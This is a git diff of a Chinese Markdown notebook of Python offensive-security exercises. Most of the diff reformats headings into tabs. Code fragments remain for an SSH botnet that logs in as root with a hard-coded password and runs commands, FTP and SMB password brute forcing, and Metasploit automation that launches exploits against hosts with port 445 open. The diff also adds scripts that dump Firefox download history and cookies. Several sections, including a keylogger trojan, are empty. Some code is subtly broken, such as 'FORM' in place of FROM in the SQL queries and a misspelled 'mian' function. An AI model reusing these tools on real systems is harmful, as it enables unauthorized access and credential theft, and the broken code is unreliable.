@@ -132,7 +132,9 @@ if __name__ == "__main__":
 
 ## 3、端口扫描器
 
-### 1、获取命令参数主机名和端口
+{% tabs %}
+{% tab title="获取命令参数主机名和端口" %}
+
 
 ```python
 # encoding: utf-8
@@ -153,8 +155,10 @@ if (Host == None)|(Ports == None):
     print parser.usage
     exit(0)
 ```
+{% endtab %}
 
-### 2、加入connscan函数
+{% tab title="加入connscan函数" %}
+
 
 ```python
 # encoding: utf-8
@@ -203,8 +207,10 @@ def portscan(host,ports):
         # 调用连接函数
         connscan(host,int(ports))
 ```
+{% endtab %}
 
-### 3、抓取目标应用banner，获取更详细信息
+{% tab title="抓取目标应用banner，获取更详细信息" %}
+
 
 ```python
 # encoding: utf-8
@@ -259,8 +265,10 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+{% endtab %}
 
-### 4、添加信号量以及加锁
+{% tab title="添加信号量以及加锁" %}
+
 
 ```python
 # encoding: utf-8
@@ -320,10 +328,16 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+{% endtab %}
+{% endtabs %}
+
+### 
 
 ## 4、构建SSH僵尸网络
 
-### 1、pexpect库
+{% tabs %}
+{% tab title="pexpect库" %}
+
 
 ```python
 # encoding: utf-8
@@ -377,8 +391,10 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+{% endtab %}
 
-### 2、pxssh\(\)函数
+{% tab title="pxssh\(\)函数" %}
+
 
 ```python
 # encoding: utf-8
@@ -463,8 +479,10 @@ def mian():
 if __name__ == "__main__":
     main()
 ```
+{% endtab %}
 
-### 3、控制多台主机的版本
+{% tab title="控制多台主机的版本" %}
+
 
 ```python
 # encoding: utf-8
@@ -514,10 +532,16 @@ addclient('127.0.0.1','root','simplexue123')
 botnetcommand('uname -v')
 botnetcommand('ls /root')
 ```
+{% endtab %}
+{% endtabs %}
+
+
 
 ## 5、FTP口令扫描与网页搜索
 
-### 1、确定服务器是否允许匿名登录
+{% tabs %}
+{% tab title="确定服务器是否允许匿名登录" %}
+
 
 ```python
 # encoding: utf-8
@@ -541,8 +565,10 @@ def anonlogin(hostame):
 host = '192.168.1.3'
 anonlogin(host)
 ```
+{% endtab %}
 
-### 2、FTP暴力破解
+{% tab title="FTP暴力破解" %}
+
 
 ```python
 # encoding: utf-8
@@ -572,8 +598,10 @@ host = '192.168.1.3'
 passwdfile = 'pass.txt'
 brutelogin(host,passwdfile)
 ```
+{% endtab %}
 
-### 3、FTP网页搜索脚本
+{% tab title="FTP网页搜索脚本" %}
+
 
 ```python
 # encoding: utf-8
@@ -608,8 +636,10 @@ ftp = ftplib.FTP(host)
 ftp.login(username,password)
 returndefault(ftp)
 ```
+{% endtab %}
 
-### 4、前三个脚本的整合
+{% tab title="前三个脚本的整合" %}
+
 
 ```python
 # encoding: utf-8
@@ -693,11 +723,15 @@ def mian():
 if __name__ == "__main__":
     main()
 ```
+{% endtab %}
+{% endtabs %}
+
+
 
 ## 6、python脚本与metasploit交互
 
-### 1、扫描开放了445端口的主机
-
+{% tabs %}
+{% tab title="扫描开放了445端口的主机" %}
 ```python
 # encoding: utf-8
 
@@ -718,9 +752,9 @@ def findtarget():
                 targets.append(t)
     return targets
 ```
+{% endtab %}
 
-### 2、新建监听器
-
+{% tab title="新建监听器" %}
 ```python
 # encoding: utf-8
 ## 
@@ -737,9 +771,9 @@ def setuphandler(configfile,lhost,lport):
     # 不重复新建监听器
     configfile.write('setg DisablePaloadHandler 1\n')
 ```
+{% endtab %}
 
-### 3、执行漏洞利用代码
-
+{% tab title="执行漏洞利用代码" %}
 ```python
 # encoding: utf-8
 
@@ -755,9 +789,9 @@ def setuphandler(configfile,target,lhost,lport):
     # 执行
     configfile.write('exploit -j -z\n')
 ```
+{% endtab %}
 
-### 4、暴力破解SMB用户
-
+{% tab title="暴力破解SMB用户" %}
 ```python
 # encoding: utf-8
 
@@ -777,9 +811,9 @@ def smbbrute(configfile,target,passwdfile,lhost,lport):
     configfile.write('set LHOST ' + lhost + '\n')
     configfile.write('exploit -j -z\n')
 ```
+{% endtab %}
 
-### 5、前四个代码的整合
-
+{% tab title="前四个代码的整合" %}
 ```python
 # encoding: utf-8
 ## 
@@ -866,8 +900,11 @@ def main():
 
 if __name__ == "__main__":
         main()
-
 ```
+{% endtab %}
+{% endtabs %}
+
+
 
 ## 7、回收站内容检查
 
@@ -1104,33 +1141,191 @@ if __name__ == "__main__":
 
 ## 9、解析火狐浏览器ssqlite3数据库
 
+{% tabs %}
+{% tab title="读取数据库信息" %}
+
+
+```python
+# -*- coding: utf-8 -*-
+
+import sqlite3  #导入库
+
+def printDownloads(downloadDB): #查看下载记录
+    conn = sqlite3.connect(downloadDB)  #链接数据库
+    c = conn.cursor()   #实例化
+    c.execute('SELECT name,source,datetime(endTime/1000000,\'unixepoch\') FORM moz_downloads;') #数据库查询
+    print '\n[*] --- Files Downloaded ---'
+    for row in c:
+        print '[+] Fiel: ' + str(row[0]) + 'from source: ' + str(row[1]) + 'at:' + str(row[2])
+
+def main():
+    downloadDB = 'downloads.sqlite'
+    printDownloads(downloadDB)
+
+if __name__ == '__main__':
+    main()
+
+```
+{% endtab %}
+
+{% tab title="读取用户cookie" %}
+
+
+```python
+import sqlite3  #导入库
+
+def printCookies(cookiesDB): #读取cookie数据库内容
+    try:
+        conn = sqlite3.connect(cookiesDB)  #链接数据库
+        c = conn.cursor()   #实例化
+        c.execute('SELECT host,name,value FORM moz_cookies;') #数据库查询
+        print '\n[*] --- Found Cookies ---'
+        for row in c:
+            host = str(row[0])
+            name = str(row[1])
+            value = str(row[2])
+            print '[+] Host: ' + host + 'name: ' + name + 'Value:' + value
+    except Exception,e:
+        if 'encrypted' in str(e):
+            print '\n[*] Error reading your cookies database. '
+            print '[*] Upgrade your Python-sqlite3 Library'
+def main():
+    cookiesDB = 'cookies.sqlite'
+    printCookies(cookiesDB)
+
+if __name__ == '__main__':
+    main()
+```
+{% endtab %}
+
+{% tab title="读取历史记录" %}
+
+
+```python
+
+```
+{% endtab %}
+
+{% tab title="获取谷歌搜索记录" %}
+
+
+```python
+
+```
+{% endtab %}
+
+{% tab title="脚本整合" %}
+
+
+```python
+
+```
+{% endtab %}
+{% endtabs %}
+
 
 
 ## 10、解析TTL字段值
 
+{% tabs %}
+{% tab title="打印TTL值" %}
+```python
 
+```
+{% endtab %}
+
+{% tab title="判断返回值" %}
+```python
+
+```
+{% endtab %}
+
+{% tab title="代码整合" %}
+```python
+
+```
+{% endtab %}
+{% endtabs %}
 
 ## 11、用anonBrowser抓取web页面
 
+{% tabs %}
+{% tab title=" anonBrowser 类库" %}
+```python
 
+```
+{% endtab %}
+
+{% tab title="解析页面" %}
+```python
+
+```
+{% endtab %}
+
+{% tab title="下载目标站点图片" %}
+```python
+
+```
+{% endtab %}
+{% endtabs %}
 
 ## 12、多线程爆破mysql
 
+```python
 
+```
 
 ## 13、IP段端口扫描
 
+{% tabs %}
+{% tab title="UI界面与扫描函数" %}
+```python
 
+```
+{% endtab %}
+
+{% tab title="ini.py" %}
+```
+
+```
+{% endtab %}
+{% endtabs %}
 
 ## 14、TCP端口扫描
 
+{% tabs %}
+{% tab title="简易脚本" %}
+```python
 
+```
+{% endtab %}
+
+{% tab title="创建线程" %}
+```
+
+```
+{% endtab %}
+{% endtabs %}
 
 ## 15、Telnet密码爆破
 
+```python
 
+```
 
 ## 16、简易木马程序
 
+{% tabs %}
+{% tab title="键盘记录" %}
+```python
 
+```
+{% endtab %}
+
+{% tab title="屏幕截图" %}
+```
+
+```
+{% endtab %}
+{% endtabs %}
 
